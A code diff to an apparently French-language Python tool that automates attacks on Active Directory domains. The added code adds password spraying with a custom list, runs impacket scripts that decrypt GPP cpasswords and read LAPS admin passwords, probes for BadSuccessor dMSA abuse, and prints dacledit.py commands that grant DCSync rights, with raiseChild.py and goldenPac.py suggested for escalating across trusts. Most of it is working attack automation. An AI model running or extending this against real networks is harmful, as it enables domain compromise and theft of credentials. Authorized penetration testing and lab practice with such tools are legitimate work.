@@ -725,7 +725,13 @@ def phase2_password(hosts, args, state):
         return
     thr = state.get("lockout_threshold")
     log(f"{C.GR}[i] Lockout threshold connu : {thr}{C.X}")
-    passwords = default_passwords(args)
+    # passwordlist fournie (capee a 500 pour rester lockout-safe) ou liste integree
+    if getattr(args, "passwordlist", None) and os.path.isfile(args.passwordlist):
+        with open(args.passwordlist, encoding="utf-8", errors="ignore") as f:
+            passwords = [l.strip() for l in f if l.strip() and not l.startswith("#")][:500]
+        log(f"{C.GR}[i] Passwordlist : {len(passwords)} mdp (capee a 500){C.X}")
+    else:
+        passwords = default_passwords(args)
     # lockout-aware : on limite le nombre de mots de passe testes
     if thr and thr > 0:
         safe_n = max(1, thr - 2)
@@ -969,8 +975,57 @@ def enum_trusts(conn, base, state):
         direction = str(getattr(e, "trustDirection", "") or "?")
         if partner:
             add_finding(state, "MED", f"Trust : {partner} (direction {direction})",
-                        "child->parent: SID history / Golden inter-domaine (ExtraSids), sqlsrv links")
+                        f"child->parent: raiseChild.py {state.get('domain')}/<user>@<dc> "
+                        f"(SID history/ExtraSids) ; sinon goldenPac.py")
             state.setdefault("trusts", []).append(partner)
+
+def enum_gpp_impacket(args, state, dc):
+    """Get-GPPPassword.py (impacket) : dechiffre les cpassword de SYSVOL -> creds."""
+    if not have("Get-GPPPassword.py"):
+        return
+    tgt, extra = impacket_creds(args)
+    rc, out, _ = run_cmd(["Get-GPPPassword.py", f"{tgt}@{dc}"] + extra, 180)
+    for m in re.finditer(r"[Uu]sername\s*:\s*(\S+).*?[Pp]assword\s*:\s*(\S+)", out, re.S):
+        user, pw = m.group(1).split("\\")[-1], m.group(2)
+        if user and pw and pw.lower() != "none":
+            cred = {"user": user, "password": pw, "hash": None, "src": "GPP"}
+            if not any(c.get("user") == user and c.get("password") == pw for c in state.get("creds", [])):
+                state.setdefault("creds", []).append(cred)
+                add_finding(state, "CRIT", f"GPP cpassword dechiffre : {user}:{pw}",
+                            "mot de passe en clair depuis SYSVOL (Groups.xml)", dc)
+
+def enum_laps_impacket(args, state, dc):
+    """GetLAPSPassword.py (impacket) : complement au LAPS via LDAP."""
+    if not have("GetLAPSPassword.py"):
+        return
+    tgt, extra = impacket_creds(args)
+    rc, out, _ = run_cmd(["GetLAPSPassword.py", tgt, "-dc-ip", dc] + extra, 180)
+    for m in re.finditer(r"([A-Za-z0-9._-]+\$?)\s+.*?\s([^\s]{8,})\s*$", out, re.M):
+        host, pw = m.group(1), m.group(2)
+        if pw and pw not in ("Password", "LAPS"):
+            add_finding(state, "CRIT", f"LAPS (impacket) : {host} -> {pw[:45]}",
+                        "mot de passe admin local en clair")
+
+def enum_dmsa_badsuccessor(conn, base, state, args, dc):
+    """BadSuccessor (2024/2025) : dMSA -> heritage de privileges. Detection + commande."""
+    try:
+        entries = ldap_search_all(
+            conn, base, "(objectClass=msDS-DelegatedManagedServiceAccount)",
+            ["sAMAccountName", "msDS-ManagedAccountPrecededByLink"])
+    except Exception:
+        return
+    if entries:
+        names = [str(getattr(e, "sAMAccountName", "") or "") for e in entries]
+        add_finding(state, "HIGH", f"dMSA present ({len(names)}) -> verifier BadSuccessor",
+                    f"badsuccessor.py {args.domain}/{args.user}@{dc} "
+                    f"(dMSA: {', '.join(n for n in names if n)[:60]})", dc)
+    # BadSuccessor exploite surtout la capacite a CREER un dMSA dans une OU accessible
+    if have("badsuccessor.py") and args.domain and _once(state, f"badsucc:{args.domain}"):
+        tgt, extra = impacket_creds(args)
+        rc, out, _ = run_cmd(["badsuccessor.py", tgt, "-dc-ip", dc] + extra, 180)
+        if re.search(r"vulnerable|writable|can create|abusable", out, re.I):
+            add_finding(state, "CRIT", "BadSuccessor exploitable (OU inscriptible pour dMSA)",
+                        "creation de dMSA -> heritage des privileges d'un compte cible", dc)
 
 # ======================================================================
 # PHASE 3 : ENUM AUTHENTIFIEE (le coeur)
@@ -1150,6 +1205,15 @@ def ldap_acl_scan(conn, base, state):
                     r = _replication_ace(ace)
                     if r and not _is_priv_sid(r[0]):
                         repl.setdefault(r[0], set()).add(r[1])
+                    # WriteDACL/GenericAll/WriteOwner sur le domaine => peut s'auto-accorder DCSync
+                    dgr = _dangerous_ace(ace, allow_inherited=True)
+                    if dgr and not _is_priv_sid(dgr[0]) and \
+                       any(x in dgr[1] for x in ("WriteDACL", "GenericAll", "WriteOwner")):
+                        pn = sid_map.get(dgr[0], dgr[0])
+                        add_finding(state, "CRIT",
+                                    f"{pn} -> {'/'.join(dgr[1])} sur le DOMAINE (=> DCSync possible)",
+                                    f"dacledit.py -action write -rights DCSync -principal {pn} "
+                                    f"-target-dn '{base}' {state.get('domain')}/{pn}:<pass>", dc)
                 for psid, rights in repl.items():
                     if "GetChangesAll" in rights:
                         pname = sid_map.get(psid, psid)
@@ -1242,6 +1306,7 @@ def phase3_authenum(hosts, args, state):
                         ldap_acl_scan(conn, base, state)
                         read_laps(conn, base, state)
                         enum_trusts(conn, base, state)
+                        enum_dmsa_badsuccessor(conn, base, state, args, dc)
                 except Exception as e:
                     log(f"{C.GR}    (dump LDAP partiel : {e}){C.X}")
             conn.unbind()
@@ -1253,6 +1318,9 @@ def phase3_authenum(hosts, args, state):
     # MSSQL (xp_cmdshell/links) + gMSA (msDS-ManagedPassword -> hash NT)
     enum_mssql(args, state, hosts)
     read_gmsa(args, state, first_dc(hosts))
+    # GPP cpassword dechiffre + LAPS via impacket (creds en clair -> boucle)
+    enum_gpp_impacket(args, state, first_dc(hosts))
+    enum_laps_impacket(args, state, first_dc(hosts))
 
     tgt, extra = impacket_creds(args)
 
@@ -1889,6 +1957,8 @@ def detect_env():
     ext = [t for t in ("nxc", "netexec", "crackmapexec", "nmap", "kerbrute",
                         "bloodhound-python", "certipy", "ldapsearch",
                         "GetNPUsers.py", "GetUserSPNs.py", "secretsdump.py",
+                        "Get-GPPPassword.py", "GetLAPSPassword.py", "dacledit.py",
+                        "targetedKerberoast.py", "badsuccessor.py", "rbcd.py",
                         "enum4linux-ng", "hashcat", "john") if have(t)]
     libs = [l for l in ("ldap3", "impacket") if have_lib(l)]
     return ext, libs
@@ -1934,6 +2004,7 @@ def main():
     p.add_argument("--lhost", help="IP de l'attaquant (pour le relais NTLM)")
     p.add_argument("--userlist", help="Liste d'utilisateurs a tester (seed phase 1 ; ex: userlist THM)")
     p.add_argument("--wordlist", help="Wordlist pour le crack auto (defaut: rockyou si present)")
+    p.add_argument("--passwordlist", help="Wordlist de mots de passe pour le spray (defaut: liste integree)")
     p.add_argument("--crack-timeout", type=int, default=900, help="Timeout crack hashcat/john (defaut 900s)")
     p.add_argument("-t", "--threads", type=int, default=100, help="Threads scan (defaut 100)")
     p.add_argument("--timeout", type=float, default=1.2, help="Timeout port (defaut 1.2s)")
